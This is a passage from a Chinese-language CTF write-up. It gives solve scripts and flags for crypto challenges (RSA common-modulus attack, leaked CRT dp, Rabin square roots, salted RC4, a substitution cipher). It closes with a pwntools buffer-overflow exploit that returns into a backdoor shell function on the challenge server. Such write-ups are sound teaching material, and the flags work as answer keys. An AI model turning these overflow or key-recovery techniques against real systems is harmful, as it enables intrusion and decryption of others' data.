# n =  20041933763448357190627850343717972264528582967835527546142957190548605428270610029367862231281895787713359644234851479710776535385541439755032309687483077090218979985453754364407030590831392946785171723586209911295724249654470575605442111447225710502302358942926274605617178895040432859429896967144420329616663507781993472314294836911728767905434642257924102824396656593460442406211312774327070056184991640489525243074951726793316964397447506279491375765341749074988401265888189321863750941333198393830420513963816131832584076574157616777287739971033307821046386250151071559472869001815834079430740105662029229636911
```
这题不是让你分解 `n`，而是典型 **RSA 共模攻击**。脚本里同一个明文 `pt`，同一个模数 `n`，却用了两个不同指数 `e_1` 和 `e_2` 加密，且 `gcd(e_1, e_2)=1`，这就已经漏风了。

已知：

- `ct1 = m^e1 mod n`
- `ct2 = m^e2 mod n`

因为 `e1` 和 `e2` 互素，所以一定存在整数 `a,b` 使得：

`a*e1 + b*e2 = 1`

这里算出来是：

- `a = -15075`
- `b = 17444`

于是：

`m = ct1^a * ct2^b mod n`

由于 `a` 是负数，所以要把 `ct1` 取模逆元再幂运算。

可直接用这段：

```
from math import gcd  
  
ct1 = 5649565335684829166994703709424227526893862676464227714220335589276704152604924324114025311155729514770870986954236504564704555535527067819510001985630888010489410355084498786686405391985307787813163409887408873131599860500818287249474949435981248525429437566989511739623645812030127508754237307712031275069780710099525638162980612740682033778940586593666680892993610688520294640884980062959079158405843270214715267881440440339150600253703915746065480485251932360881192748881417272231086499695809894156350146444967947730629173024309214554705882003920254677073584631736742572109190599880801473561959319027076441953445  
ct2 = 18057738004521442202581208706347939725140669900210781627129228864852861993001064574996038998190758020094241377866589024516040225406530219251533264723200285643625227689027372929065070061403841600339743979018711778484342112384547861311017571072207706363341501151970830224052331515660939863240931224477883263629549854691715424922845010950429159326308647808310970838674468530257927010981568201656330319135247562919603753523391148946139453657084433473736518140826834607288043167145971704069967785291825113657089124890698730576640845997643271760048177660480776933178966895624625446578014520381072642845438343988815282525599  
e1 = 38393  
e2 = 33179  
n = 20041933763448357190627850343717972264528582967835527546142957190548605428270610029367862231281895787713359644234851479710776535385541439755032309687483077090218979985453754364407030590831392946785171723586209911295724249654470575605442111447225710502302358942926274605617178895040432859429896967144420329616663507781993472314294836911728767905434642257924102824396656593460442406211312774327070056184991640489525243074951726793316964397447506279491375765341749074988401265888189321863750941333198393830420513963816131832584076574157616777287739971033307821046386250151071559472869001815834079430740105662029229636911  
  
def egcd(a, b):  
    if b == 0:  
        return a, 1, 0  
    g, x1, y1 = egcd(b, a % b)  
    return g, y1, x1 - (a // b) * y1  
  
def long_to_bytes(x):  
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')  
  
g, a, b = egcd(e1, e2)  
print(g, a, b)   # 1, -15075, 17444  
  
m = (pow(ct1, a, n) * pow(ct2, b, n)) % n  
print(long_to_bytes(m))
```

```
qsnctf{ba1073db090b3090c111339b0a7ffce5}
```
### easy RC4

```
什么RC4？  
9PKjvafI0SxgbC87AIDyADcmoBX6rdk9VD2UpHo=  
Key：qsnctf2026
```
- 先把 Base64 解码
- **前 16 字节当 salt**
- 真正 RC4 key 是 **SHA1(key + salt)**
- 再用这个 key 去解后面的密文
```
import base64, hashlib

cipher_b64 = "9PKjvafI0SxgbC87AIDyADcmoBX6rdk9VD2UpHo="
key = b"qsnctf2026"

data = base64.b64decode(cipher_b64)
salt = data[:16]
ct = data[16:]

def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        out.append(b ^ k)
    return bytes(out)

rc4_key = hashlib.sha1(key + salt).digest()
pt = rc4(ct, rc4_key)
print(pt.decode())
```
得到flag
```
flag{e12ax8u}
```
### 字符串的秘密

```
你，帮我找找这段文字的秘密吧？
```

```
aaa.txt
Sara, yoh vikk amjure on un axciting bohrnay of kaurning ujoht cyjarlachrity. Va suda prapuraz u comprasanlida kaurning puts for yoh, gruzhukky ansuncing yohr lachrity cupujikitial from julic enovkazga to uzduncaz leikkl. For axumpka: MwehM3f1WL8mUQIME0UFBE0=
```
很明显进行了字母的替换，先根据语义猜下替换表
```
- `yoh` → `you`
- `vikk` → `will`
- `amjure` → `embark`
- `axciting` → `exciting`
- `bohrnay` → `journey`
- `kaurning` → `learning`
- `lachrity` → `security`
- `cupujikitial` → `capabilities`
- `leikkl` → `skills`
```
之后把最后的类base64文本也进行替换
恢复得到 `MzkuM3f1ZS8mAQIMK0AFJK0=`
但依然无法得到flag

这里是放随波逐流里看到rot13的前几个字符有点眼熟，应该就是flag的base64编码
```
ZmxhZ3s1MF8zNDVZX0NSWX0=
```
果然在ROT13后得到正确flag
```
flag{50_345Y_CRY}
```
### Half a key

```
某系统采用 RSA 公钥密码体制对敏感信息进行加密。  
为了提升解密效率，系统在内部实现中使用了基于中国剩余定理（CRT）的优化方案。然而，在一次配置失误中，部分本应严格保密的内部参数被意外泄露。  
你获得了该系统的公开参数、一段密文，以及一项额外的内部数据。虽然完整的私钥并未公开，但这些信息或许已经足够还原出原始明文。  
请分析给定参数，恢复加密前的消息内容。
```

```
n  = 15436586506265382785524723267926444275462583019354383194654618933970433830434544481689625981207606375978708092558218246652496848076710411132268953499043735379180887935756772262155008862710764094267410967565241203605386593697737434875910984139143271151900377372693190411504735649123965519189648830868758032067
e  = 65537
dp = 379731142995118368195086502083726192650138136864805821111741080341262318450359112900427553070639257250091100401461103206486523535760843615494638091936809
c  = 854977693463411460490582164652536883002498905251706308634386005958509682016980677282553767296915296737583796051269333809745316569004849097563723358017329758234680761174609149316747091398434695986939450351231497326579265836956690907677434464255178122585307742001203732956675315052213672484434073446872723134

```
可以解，核心漏洞就在泄露的 `dp`。题目给出的参数是 `n, e, dp, c`。

思路很直接：

RSA-CRT 里有

```
dp=d mod (p−1)
```

因此必然满足

```
e⋅dp≡1(modp−1)
```

也就是

```
e⋅dp−1=k(p−1)
```

其中 kkk 是一个不大的整数，通常直接枚举 1≤k<e1 \le k < e1≤k<e 就能把 ppp 挖出来。

我用这个关系枚举后得到：

```
p=1995864938525228366059939376618907970784513840380846827989427795518911585875465970178468244894577352024959535408657977451560453361388917156842737720046729p = 1995864938525228366059939376618907970784513840380846827989427795518911585875465970178468244894577352024959535408657977451560453361388917156842737720046729p=1995864938525228366059939376618907970784513840380846827989427795518911585875465970178468244894577352024959535408657977451560453361388917156842737720046729
```

再由

```
q=n/p
```

得到：

```
q=7734284123289267068033523825299099420177070949893563248844370573682513681467852020238975496623309265977307173094834517352850430238270999224135253858143723q = 7734284123289267068033523825299099420177070949893563248844370573682513681467852020238975496623309265977307173094834517352850430238270999224135253858143723q=7734284123289267068033523825299099420177070949893563248844370573682513681467852020238975496623309265977307173094834517352850430238270999224135253858143723
```

之后正常算：

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325183432950.png)

解出的明文是：

```
flag{136c40e7a4d7ec032f28cd63ed090781}
```

### Four Ways to the Truth

```
并非所有缺失的参数都是真正“缺失”的
```

```
p = 7843924760949873188201496026705455073125667712660002135887161079633254312879905501204855425456884502003894146991780856880279808965014803584494444568674087      
q = 1140962409915024811090299765305244489074219812060197521898407764373654976342197131381234656216901694745972908393258042324146363330463003052469652666554471      
e = 2
c = 170041716912112266353311555796224814539989621875376673120238246557647197956716037204849248165596484091026430610474184173388604052966204512334147210403868840531083264816571442641437961
```

- 给出的参数里 `e = 2`，这不是正常 RSA 指数，而是变成了  
    `c ≡ m² (mod n)`，其中 `n = p*q`。
- 题目又直接把 `p` 和 `q` 给出来了，所以不用“分解 n”这一步，直接分别在模 `p`、模 `q` 下对 `c` 开平方即可。
- 因为 `p % 4 = 3` 且 `q % 4 = 3`，平方根可以用  
    `mp = c^((p+1)/4) mod p`、`mq = c^((q+1)/4) mod q` 算。
- 然后用 CRT 合并，会得到 **4 个候选根**。其中只有一个转成十六进制再转 ASCII 后是正常可读文本，也就是上面的 flag。

这题名叫 **Four Ways to the Truth**，名字本身就在明示你会得到 **四个平方根**，别被它绕进去。真正要做的是把 4 个候选都试一遍，找到那个像人话的
```
flag{e76926fb679f90b8367463ad2b0c27f4}
```
## pwn
原本shift+F12找了半天能调用的函数，本来思路是给了system地址，找一个/bin/sh就行了

但是点开左边的函数一点一点找发现

```php
int f4ck_backdoor_flag()
{
  return system("sh");
}
```

找了半天找到一个这个函数，那不就可以直接交互吗？

080490EE是地址

```php
from pwn import *
p = remote('challenge.qsnctf.com', 57242)
payload = b'a'*(0x90+4) + p32(0x080490EE)
p.sendline(payload)
p.interactive()
```

